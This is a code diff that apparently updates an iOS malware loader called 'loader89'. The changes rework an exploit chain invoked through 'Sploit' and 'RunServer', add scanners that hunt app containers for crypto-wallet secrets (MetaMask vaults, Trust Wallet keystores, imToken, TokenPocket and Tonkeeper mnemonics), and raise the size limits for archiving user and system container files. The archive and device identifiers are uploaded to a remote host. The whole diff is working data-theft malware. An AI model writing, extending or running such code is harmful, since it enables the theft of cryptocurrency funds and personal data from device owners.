@@ -21,6 +21,7 @@ extern unsigned int sleep(unsigned int);
 extern long time(void *);
 extern int pthread_create(void *, const void *, void *(*)(void *), void *);
 extern int pthread_detach(void *);
+extern int pthread_join(void *, void **);
 extern int sysctlbyname(const char *, void *, unsigned long *, void *, unsigned long);
 extern char *getenv(const char *);
 extern int strcmp(const char *, const char *);
@@ -46,6 +47,8 @@ extern const char *_dyld_get_image_name(unsigned int);
 #include <unistd.h>
 #include <sys/wait.h>
 #include <signal.h>
+#include <errno.h>
+#include <string.h>
 
 static void *(*p_dlsym)(void *, const char *);
 static void *(*p_msgSend)();
@@ -58,6 +61,8 @@ static int g_logfd = -1;
 static char g_logpath[512];
 static char g_host[128];
 static int g_port = LOADER89_DEFAULT_PORT;
+static volatile int g_exploit_state = 0; /* 0=idle, 1=running, 2=success, 3=fail */
+static int g_mha_leases = 0;
 
 static void raw_log(const char *s) {
     if (g_logfd >= 0) { write(g_logfd, s, strlen(s)); write(g_logfd, "\n", 1); }
@@ -186,6 +191,33 @@ static long dir_file_count(const char *path, int depth) {
     return n;
 }
 
+static void log_root_top(const char *tag, const char *root, int max_entries) {
+    if (!root || !root[0]) { log_info("root listing skipped (empty)"); return; }
+    DIR *dir = opendir(root);
+    if (!dir) { log_error("root listing FAIL"); return; }
+    int shown = 0, files = 0, dirs = 0;
+    struct dirent *e;
+    while ((e = (struct dirent *)readdir(dir))) {
+        const char *nm = e->d_name;
+        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
+        char *full = cat3(root, "/", nm);
+        struct stat st;
+        int is_dir = lstat(full, &st) == 0 && ((st.st_mode & 0xF000) == 0x4000);
+        if (is_dir) dirs++; else files++;
+        if (shown < max_entries) {
+            char line[520];
+            snprintf(line, sizeof(line), "%s entry=%s type=%s", tag, nm, is_dir ? "dir" : "file");
+            log_info(line);
+            shown++;
+        }
+        free(full);
+    }
+    closedir(dir);
+    char msg[220];
+    snprintf(msg, sizeof(msg), "%s totals dirs=%d files=%d shown=%d", tag, dirs, files, shown);
+    log_info(msg);
+}
+
 static char *objc_property_string(void *obj, const char *selname) {
     if (!obj) return 0;
     void *v = p_msgSend(obj, p_sel(selname));
@@ -195,8 +227,14 @@ static char *objc_property_string(void *obj, const char *selname) {
 static char *device_string(const char *selector) {
     void *dev = p_msgSend(p_getClass("UIDevice"), p_sel("currentDevice"));
     if (!dev) return 0;
-    if (strcmp(selector, "identifierForVendor") == 0)
-        return objc_cstr(p_msgSend(dev, p_sel("UUIDString")));
+    if (strcmp(selector, "identifierForVendor") == 0) {
+        /* v5.2 fix: UIDevice.identifierForVendor -> NSUUID.UUIDString.
+           Calling UUIDString directly on UIDevice raises
+           NSInvalidArgumentException / SIGABRT. */
+        void *uuid = p_msgSend(dev, p_sel("identifierForVendor"));
+        if (!uuid) return 0;
+        return objc_cstr(p_msgSend(uuid, p_sel("UUIDString")));
+    }
     return objc_cstr(p_msgSend(dev, p_sel(selector)));
 }
 
@@ -329,7 +367,7 @@ static int is_dirlike(const char *path, struct stat *st) {
 
 static int tar_add_tree(const char *base, const char *rel, int tarfd, char *out, unsigned long *used,
                         unsigned long outn, int max_files, int depth, unsigned long *budget) {
-    if (depth > 5 || max_files <= 0 || *used + 1 >= outn || *budget < 1024) return 0;
+    if (depth > 8 || max_files <= 0 || *used + 1 >= outn || *budget < 1024) return 0;
     char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
     DIR *dir = opendir(full);
     free(full);
@@ -427,50 +465,282 @@ static void repair_core_log_sink(void *core) {
     log_info(msg);
 }
 
-static void *run_server_worker(void *arg) {
-    void *inst = arg;
-    if (inst) {
-        log_info("RunServer start");
-        p_msgSend(inst, p_sel("RunServer"));
-        log_info("RunServer returned");
-    }
-    return 0;
-}
-
-static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);
-
-static int exploit_child_main(void *acqCls, void *core) {
-    if (!acqCls) return 2;
-    void *acq = p_msgSend(p_msgSend(acqCls, p_sel("alloc")), p_sel("init"));
-    if (!acq) { log_error("exploit child: AcqViewCntrlr_ instance FAIL"); return 3; }
-    static void *serverThread;
-    if (pthread_create(&serverThread, 0, run_server_worker, acq) == 0) pthread_detach(serverThread);
-    sleep(1);
-    p_msgSend(acq, p_sel("InitLogs"));
-    log_info("InitLogs returned");
-    char *st0 = objc_property_string(acq, "lblState");
-    log_info(st0 ? st0 : "lblState=(null)");
-    if (st0) free(st0);
-    log_info("Sploit start");
-    p_msgSend(acq, p_sel("Sploit"));
-    log_info("Sploit returned");
-    sleep(3);
-    char *state = objc_property_string(acq, "lblState");
-    log_info(state ? state : "lblState=(null)");
-    if (state) free(state);
-    if (!core) { p_release(acq); return 4; }
+static int exploit_core_ok(void *core) {
+    if (!core) return 0;
     unsigned char *flag = (unsigned char *)core + 0x6b96d8;
     int ok = (*flag == 0);
     char msg[220];
-    snprintf(msg, sizeof(msg), "exploit raw=%d ok=%d flag_addr=%p", (int)*flag, ok, (void *)flag);
+    snprintf(msg, sizeof(msg), "core flag addr=%p raw=%d ok=%d", (void *)flag, (int)*flag, ok);
+    log_info(msg);
+    return ok;
+}
+
+/* v5.6: original main binary calls CLASS methods, not instance methods.
+ * Disassembly shows: objc_getClass(AcqViewCntrlr_) -> Sploit -> RunServer.
+ * No alloc/init and no InitLogs are called by the original host. */
+static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root);
+static int exploit_class_main(void *acqCls, void *core) {
+    if (!acqCls) return 2;
+    log_info("Sploit before");
+    p_msgSend(acqCls, p_sel("Sploit"));
+    log_info("Sploit after");
+    int ok1 = exploit_core_ok(core);
+    log_info("RunServer before");
+    p_msgSend(acqCls, p_sel("RunServer"));
+    log_info("RunServer after");
+    int ok2 = exploit_core_ok(core);
+    int ok = ok1 || ok2;
+    char msg[180];
+    snprintf(msg, sizeof(msg), "exploit class-chain result sploit_flag=%d runserver_flag=%d ok=%d", ok1, ok2, ok);
     log_info(msg);
     if (ok) {
-        upload_manifest(1, 0, "exploit-child", 0);
-        p_release(acq);
+        upload_manifest(1, 0, "exploit-class", 0);
         return 0;
     }
-    p_release(acq);
     return 6;
+}
+
+struct exploit_thread_args {
+    void *acqCls;
+    void *core;
+};
+
+static void *exploit_thread_worker(void *arg) {
+    struct exploit_thread_args *a = (struct exploit_thread_args *)arg;
+    int rc = exploit_class_main(a->acqCls, a->core);
+    g_exploit_state = (rc == 0) ? 2 : 3;
+    return (void *)(long)rc;
+}
+
+/* ---------- v5.6 collection inventories ---------- */
+static void extract_bundle_like(const char *data, unsigned long n, char *out, unsigned long outn) {
+    out[0] = 0;
+    unsigned long best_len = 0, best_at = 0;
+    for (unsigned long i = 0; i < n; i++) {
+        if (!((data[i] >= 'a' && data[i] <= 'z') || (data[i] >= 'A' && data[i] <= 'Z') ||
+              (data[i] >= '0' && data[i] <= '9') || data[i] == '.' || data[i] == '-' || data[i] == '_')) continue;
+        unsigned long j = i;
+        while (j < n && ((data[j] >= 'a' && data[j] <= 'z') || (data[j] >= 'A' && data[j] <= 'Z') ||
+                         (data[j] >= '0' && data[j] <= '9') || data[j] == '.' || data[j] == '-' || data[j] == '_')) j++;
+        unsigned long len = j - i;
+        if (len >= 6 && len < 160 && memchr(data + i, '.', len)) {
+            int score = 0;
+            if (len > best_len) score = 1;
+            if ((len >= 9 && memcmp(data + i, "com.", 4) == 0) ||
+                (len >= 11 && memcmp(data + i, "im.token.app", 11) == 0) ||
+                (len >= 16 && memcmp(data + i, "io.metamask.MetaMask", 16) == 0) ||
+                (len >= 17 && memcmp(data + i, "com.sixdays.trust", 17) == 0)) score = 2;
+            if (score >= (best_len ? 1 : 0)) { best_len = len; best_at = i; }
+        }
+        i = j;
+    }
+    if (best_len && best_len < outn) {
+        unsigned long k = 0;
+        for (; k < best_len && k + 1 < outn; k++) out[k] = data[best_at + k];
+        out[k] = 0;
+    }
+}
+
+static void read_bundle_identity(const char *dir, char *out, unsigned long outn) {
+    out[0] = 0;
+    char *p = cat3(dir, "/.com.apple.mobile_container_manager.metadata.plist", "");
+    int fd = open(p, O_RDONLY);
+    free(p);
+    if (fd < 0) return;
+    char buf[8192];
+    long n = read(fd, buf, sizeof(buf));
+    close(fd);
+    if (n > 0) extract_bundle_like(buf, (unsigned long)n, out, outn);
+}
+
+static long count_direct_dirs(const char *path) {
+    DIR *dir = opendir(path);
+    if (!dir) return 0;
+    long n = 0;
+    struct dirent *e;
+    while ((e = (struct dirent *)readdir(dir))) {
+        if (e->d_name[0] == '.' && (e->d_name[1] == 0 || (e->d_name[1] == '.' && e->d_name[2] == 0))) continue;
+        char *full = cat3(path, "/", e->d_name);
+        struct stat st;
+        if (lstat(full, &st) == 0 && (st.st_mode & 0xF000) == 0x4000) n++;
+        free(full);
+    }
+    closedir(dir);
+    return n;
+}
+
+struct Inventory {
+    char *out;
+    unsigned long cap;
+    unsigned long *used;
+    long files;
+    long walletsv2;
+    long rct_storage;
+    long meta_vault;
+    long trust_keystore;
+    long trust_sekek;
+    long tp_sqlite;
+    long tp_key;
+    long ton_vault;
+    long photos;
+    long notes;
+};
+
+static void inv_add_raw(struct Inventory *iv, const char *text) {
+    unsigned long n = strlen(text);
+    if (*iv->used + n + 2 < iv->cap) {
+        if (*iv->used) iv->out[(*iv->used)++] = ',';
+        for (unsigned long i = 0; i < n; i++) iv->out[(*iv->used)++] = text[i];
+        iv->out[*iv->used] = 0;
+    }
+}
+
+static void inv_add_hit(struct Inventory *iv, const char *rel, long size, const char *kind) {
+    char esc[900], epath[600];
+    json_escape(epath, sizeof(epath), rel);
+    int n = snprintf(esc, sizeof(esc), "{\"path\":\"%s\",\"size\":%ld,\"kind\":\"%s\"}", epath, size, kind);
+    if (n > 0) inv_add_raw(iv, esc);
+}
+
+static void scan_inventory_tree(const char *base, const char *rel, int depth, struct Inventory *iv) {
+    if (depth > 6 || iv->files > 20000) return;
+    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
+    DIR *dir = opendir(full);
+    free(full);
+    if (!dir) return;
+    struct dirent *e;
+    while ((e = (struct dirent *)readdir(dir))) {
+        const char *nm = e->d_name;
+        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
+        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
+        char *path = cat3(base, "/", r2);
+        struct stat st;
+        if (lstat(path, &st) == 0) {
+            if ((st.st_mode & 0xF000) == 0x4000) {
+                scan_inventory_tree(base, r2, depth + 1, iv);
+            } else if (st.st_size > 0) {
+                iv->files++;
+                char lower[1200];
+                unsigned long i = 0;
+                for (; r2[i] && i + 1 < sizeof(lower); i++) lower[i] = (r2[i] >= 'A' && r2[i] <= 'Z') ? (char)(r2[i] + 32) : r2[i];
+                lower[i] = 0;
+                if (strstr(lower, "/documents/walletsv2/") && strstr(lower, ".json")) { iv->walletsv2++; inv_add_hit(iv, r2, (long)st.st_size, "imtoken_wallet"); }
+                else if (strstr(lower, "rctasynclocalstorage_v1")) { iv->rct_storage++; inv_add_hit(iv, r2, (long)st.st_size, "imtoken_storage"); }
+                else if (strstr(lower, "vault") || strstr(lower, "keyringcontroller")) { iv->meta_vault++; inv_add_hit(iv, r2, (long)st.st_size, "metamask_vault"); }
+                else if (strstr(lower, "/documents/keystore/") && !strstr(lower, ".sekek")) { iv->trust_keystore++; inv_add_hit(iv, r2, (long)st.st_size, "trust_keystore"); }
+                else if (strstr(lower, ".sekek")) { iv->trust_sekek++; inv_add_hit(iv, r2, (long)st.st_size, "trust_sekek"); }
+                else if (strstr(lower, "db/main.sqlite3")) { iv->tp_sqlite++; inv_add_hit(iv, r2, (long)st.st_size, "tokenpocket_sqlite"); }
+                else if (strstr(lower, "f4secyr/")) { iv->tp_key++; inv_add_hit(iv, r2, (long)st.st_size, "tokenpocket_key"); }
+                else if (strstr(lower, "mnemonics_vault")) { iv->ton_vault++; inv_add_hit(iv, r2, (long)st.st_size, "tonkeeper_vault"); }
+                else if (strstr(lower, "/documents/photos/") || strstr(lower, "/documents/media/")) { iv->photos++; }
+                else if (strstr(lower, "note") || strstr(lower, "memo")) { iv->notes++; }
+            }
+        }
+        free(path);
+        if (r2 != (char *)nm) free(r2);
+    }
+    closedir(dir);
+}
+
+static void scan_container_inventory(const char *root, char *out, unsigned long cap, unsigned long *used, long *count) {
+    DIR *dir = opendir(root);
+    if (!dir) return;
+    struct dirent *e;
+    while ((e = (struct dirent *)readdir(dir))) {
+        const char *nm = e->d_name;
+        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
+        char *l1 = cat3(root, "/", nm);
+        struct stat st;
+        if (lstat(l1, &st) != 0 || (st.st_mode & 0xF000) != 0x4000) { free(l1); continue; }
+        DIR *d2 = opendir(l1);
+        if (!d2) { free(l1); continue; }
+        struct dirent *e2;
+        while ((e2 = (struct dirent *)readdir(d2))) {
+            const char *nm2 = e2->d_name;
+            if (nm2[0] == '.' && (nm2[1] == 0 || (nm2[1] == '.' && nm2[2] == 0))) continue;
+            char *container = cat3(l1, "/", nm2);
+            struct stat st2;
+            if (lstat(container, &st2) == 0 && (st2.st_mode & 0xF000) == 0x4000) {
+                char bid[160];
+                read_bundle_identity(container, bid, sizeof(bid));
+                long files = dir_file_count(container, 5);
+                char rel[900], erel[600], ebid[200], item[1200];
+                snprintf(rel, sizeof(rel), "%s/%s", nm, nm2);
+                json_escape(erel, sizeof(erel), rel);
+                json_escape(ebid, sizeof(ebid), bid);
+                snprintf(item, sizeof(item), "{\"path\":\"%s\",\"bundle\":\"%s\",\"readable\":true,\"files\":%ld}", erel, ebid, files);
+                if (*used + strlen(item) + 2 < cap) {
+                    if (*used) out[(*used)++] = ',';
+                    for (unsigned long k = 0; item[k]; k++) out[(*used)++] = item[k];
+                    out[*used] = 0;
+                    (*count)++;
+                }
+            }
+            free(container);
+        }
+        closedir(d2);
+        free(l1);
+    }
+    closedir(dir);
+}
+
+static void write_inventory_files(const char *mcm_root) {
+    char *home = getenv("HOME");
+    if (!home || !mcm_root || !mcm_root[0]) return;
+
+    char cout[65536];
+    unsigned long cu = 0;
+    long cc = 0;
+    cout[0] = 0;
+    scan_container_inventory(mcm_root, cout, sizeof(cout), &cu, &cc);
+    char *catpath = cat3(mcm_root, "/[MHA-C2] App Data", "");
+    g_mha_leases = (int)count_direct_dirs(catpath);
+    free(catpath);
+    char cpath[800];
+    char *tmp = cat3(home, "/Documents/container_inventory.json", "");
+    unsigned long i = 0;
+    for (; i < sizeof(cpath) - 1 && tmp[i]; i++) cpath[i] = tmp[i];
+    cpath[i] = 0;
+    free(tmp);
+    int fd = open(cpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) {
+        char head[128];
+        int n = snprintf(head, sizeof(head), "{\"containers\":[");
+        write_all(fd, head, (unsigned long)n);
+        if (cu) write_all(fd, cout, cu);
+        char tail[96];
+        n = snprintf(tail, sizeof(tail), "],\"count\":%ld,\"mha_leases\":%d}", cc, g_mha_leases);
+        write_all(fd, tail, (unsigned long)n);
+        close(fd);
+    }
+
+    char wout[65536];
+    unsigned long wu = 0;
+    struct Inventory iv = {wout, sizeof(wout), &wu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
+    wout[0] = 0;
+    scan_inventory_tree(mcm_root, "", 0, &iv);
+    char wpath[800];
+    tmp = cat3(home, "/Documents/wallet_inventory.json", "");
+    i = 0;
+    for (; i < sizeof(wpath) - 1 && tmp[i]; i++) wpath[i] = tmp[i];
+    wpath[i] = 0;
+    free(tmp);
+    fd = open(wpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) {
+        char head[160];
+        int n = snprintf(head, sizeof(head), "{\"scanned_files\":%ld,\"hits\":[", iv.files);
+        write_all(fd, head, (unsigned long)n);
+        if (wu) write_all(fd, wout, wu);
+        char tail[420];
+        n = snprintf(tail, sizeof(tail),
+            "],\"imtoken_wallets\":%ld,\"imtoken_storage\":%ld,\"metamask_vault\":%ld,\"trust_keystore\":%ld,\"trust_sekek\":%ld,\"tokenpocket_sqlite\":%ld,\"tokenpocket_key\":%ld,\"tonkeeper_vault\":%ld}",
+            iv.walletsv2, iv.rct_storage, iv.meta_vault, iv.trust_keystore, iv.trust_sekek, iv.tp_sqlite, iv.tp_key, iv.ton_vault);
+        write_all(fd, tail, (unsigned long)n);
+        close(fd);
+    }
+    char msg[360];
+    snprintf(msg, sizeof(msg), "inventory written containers=%ld leases=%d scanned=%ld walletsv2=%ld trust=%ld tp=%ld", cc, g_mha_leases, iv.files, iv.walletsv2, iv.trust_keystore + iv.trust_sekek, iv.tp_sqlite + iv.tp_key);
+    log_info(msg);
 }
 
 static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root) {
@@ -496,7 +766,7 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
     files[0] = 0;
     unsigned long used = 0;
     int nfiles = 0;
-    unsigned long budget = 48 * 1024 * 1024;
+    unsigned long budget = 128 * 1024 * 1024;
     char *home = getenv("HOME");
     char tarpath[600];
     tarpath[0] = 0;
@@ -511,22 +781,27 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
     int tarfd = open(tarpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     log_info(tarfd >= 0 ? "tar open OK" : "tar open FAIL");
     if (tarfd >= 0) {
+        log_info("tar collect begin own-docs");
         if (home) {
             char *docs = cat3(home, "/Documents", "");
-            nfiles += tar_add_tree(docs, "", tarfd, files, &used, sizeof(files), 120, 0, &budget);
+            nfiles += tar_add_tree(docs, "", tarfd, files, &used, sizeof(files), 2000, 0, &budget);
             free(docs);
             char *lib = cat3(home, "/Library", "");
-            nfiles += tar_add_tree(lib, "Library", tarfd, files, &used, sizeof(files), 120, 0, &budget);
+            nfiles += tar_add_tree(lib, "Library", tarfd, files, &used, sizeof(files), 2000, 0, &budget);
             free(lib);
+            log_u64("tar own files=", (u64)nfiles);
         }
         if (mha_ok && mcm_root && mcm_root[0]) {
-            nfiles += tar_add_tree(mcm_root, "MCMRoot", tarfd, files, &used, sizeof(files), 650, 0, &budget);
+            log_info("tar collect begin MCMRoot");
+            nfiles += tar_add_tree(mcm_root, "MCMRoot", tarfd, files, &used, sizeof(files), 20000, 0, &budget);
+            log_u64("tar after MCMRoot files=", (u64)nfiles);
         }
         if (exploit_ok) {
+            log_info("tar collect begin exploit-containers");
             nfiles += tar_add_tree("/var/mobile/Containers/Data/Application", "Containers/Data/Application", tarfd,
-                                   files, &used, sizeof(files), 120, 0, &budget);
+                                   files, &used, sizeof(files), 20000, 0, &budget);
             nfiles += tar_add_tree("/var/mobile/Containers/Shared/AppGroup", "Containers/Shared/AppGroup", tarfd,
-                                   files, &used, sizeof(files), 80, 0, &budget);
+                                   files, &used, sizeof(files), 5000, 0, &budget);
         }
         finish_tar(tarfd);
     }
@@ -562,9 +837,9 @@ static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, con
     int n = snprintf(body + bo, 20480 - bo,
         "{\"deviceName\":\"%s\",\"model\":\"%s\",\"systemName\":\"iOS\",\"systemVersion\":\"%s\","
         "\"identifierForVendor\":\"%s\",\"appBundle\":\"%s\",\"appVersion\":\"%s\","
-        "\"collectedAt\":%s,\"exploit\":%s,\"mha\":%s,\"source\":\"%s\",\"mcmRoot\":\"%s\",\"sandboxFiles\":[",
+        "\"collectedAt\":%s,\"exploit\":%s,\"mha\":%s,\"mhaLeases\":%d,\"source\":\"%s\",\"mcmRoot\":\"%s\",\"sandboxFiles\":[",
         deviceName, eName, sysver, idfv, bundleId, appVersion, ts,
-        exploit_ok ? "true" : "false", mha_ok ? "true" : "false", eSource, eRoot);
+        exploit_ok ? "true" : "false", mha_ok ? "true" : "false", g_mha_leases, eSource, eRoot);
     bo += n;
     for (unsigned long k = 0; k < used && bo < 19700; k++) body[bo++] = files[k];
     n = snprintf(body + bo, 20480 - bo, "]}");
@@ -623,7 +898,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v4.7 exploit-child start ===");
+    log_info("=== loader89 v5.6 original-class-chain start ===");
     read_runtime_config();
     char msg[600], bid[200];
     snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
@@ -654,13 +929,14 @@ static void *worker(void *arg) {
     log_info(msg);
     void *acqCls = p_getClass("AcqViewCntrlr_");
     log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
+    int fork_failed = 0;
     if (acqCls) {
         /* RunServer has been seen aborting the whole process.  Run the exploit
          * in an isolated child; if the child aborts, the parent keeps the
          * MHA/MCM fallback alive. */
         pid_t child = fork();
         if (child == 0) {
-            int rc = exploit_child_main(acqCls, core);
+            int rc = exploit_class_main(acqCls, core);
             _exit(rc);
         } else if (child > 0) {
             snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=45s", (int)child);
@@ -686,7 +962,9 @@ static void *worker(void *arg) {
                 log_warn(msg);
             }
         } else {
-            log_warn("fork FAIL; skip exploit to protect fallback");
+            fork_failed = 1;
+            snprintf(msg, sizeof(msg), "fork FAIL errno=%d (%s); queue direct exploit", errno, strerror(errno));
+            log_warn(msg);
         }
     } else {
         log_warn("exploit chain SKIPPED (AcqViewCntrlr_ missing)");
@@ -711,8 +989,7 @@ static void *worker(void *arg) {
         log_info(msg);
         int ready_ok = 0;
         for (int i = 0; i < 20; i++) {
-            ready_ok = ready ? ready() : 0;
-            if (ready_ok) break;
+            /* v4.8: capture the virtual root BEFORE the ready short-circuit. */
             void *r = root ? root() : 0;
             if (r) {
                 char *cs = objc_cstr(r);
@@ -723,23 +1000,68 @@ static void *worker(void *arg) {
                     free(cs);
                 }
             }
-            if (r) p_release(r);
+            /* v5.4 fix: MCMFilzaVirtualRoot returns an autoreleased object.
+               Releasing it here causes autorelease-pool double release when
+               the worker thread exits (objc_autoreleasePoolPop SIGSEGV). */
+            ready_ok = ready ? ready() : 0;
+            if (ready_ok) break;
             if (mcm_root[0] && path_exists(mcm_root)) break;
             sleep(1);
         }
         ready_ok = ready ? ready() : 0;
+        if (!mcm_root[0]) {
+            char *home = getenv("HOME");
+            char *guess = home ? cat3(home, "/Documents/Device Storage", "") : 0;
+            if (guess) {
+                unsigned long j = 0;
+                for (; j < sizeof(mcm_root) - 1 && guess[j]; j++) mcm_root[j] = guess[j];
+                mcm_root[j] = 0;
+                free(guess);
+            }
+            log_info("MCM root fallback to Documents/Device Storage");
+        }
         int root_exists = path_exists(mcm_root);
         long root_files = root_exists ? dir_file_count(mcm_root, 3) : -1;
         mha_ok = ready_ok || (root_exists && root_files > 0);
         snprintf(msg, sizeof(msg), "MHA/MCM ready=%d root=%s exists=%d files=%ld", ready_ok, mcm_root, root_exists, root_files);
         log_info(msg);
+        if (root_exists) log_root_top("MCMRootTop", mcm_root, 120);
     }
+
+    /* iOS frequently denies fork() from this host.  After the MHA/MCM
+       fallback is alive, try the exploit once in-process so we can still
+       report real exploit_success instead of silently skipping it. */
+    if (fork_failed && acqCls) {
+        struct exploit_thread_args ea = { acqCls, core };
+        void *th = 0;
+        g_exploit_state = 1;
+        log_info("direct exploit fallback start");
+        if (pthread_create(&th, 0, exploit_thread_worker, &ea) == 0) {
+            pthread_detach(th);
+            for (int i = 0; i < 12 && g_exploit_state == 1; i++) sleep(1);
+            if (g_exploit_state == 1) {
+                log_warn("direct exploit fallback TIMEOUT; continuing MHA/upload");
+                exploit_ok = 0;
+            } else {
+                exploit_ok = (g_exploit_state == 2);
+                snprintf(msg, sizeof(msg), "direct exploit fallback state=%d exploit_ok=%d", g_exploit_state, exploit_ok);
+                log_info(msg);
+            }
+        } else {
+            g_exploit_state = 3;
+            log_warn("direct exploit fallback pthread FAIL");
+        }
+    }
+
     post_log_now();
 
     char source[80];
     snprintf(source, sizeof(source), "%s", exploit_ok ? "exploit+mha" : (mha_ok ? "mha" : "fallback"));
+    write_inventory_files(mcm_root);
     void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root);
     log_info(up ? "dual-chain upload OK" : "dual-chain upload FAIL");
+    snprintf(msg, sizeof(msg), "FINAL exploit_success=%d mha_success=%d source=%s root=%s", exploit_ok, mha_ok, source, mcm_root);
+    log_info(msg);
     post_log_now();
     log_info("=== loader89 done ===");
     if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
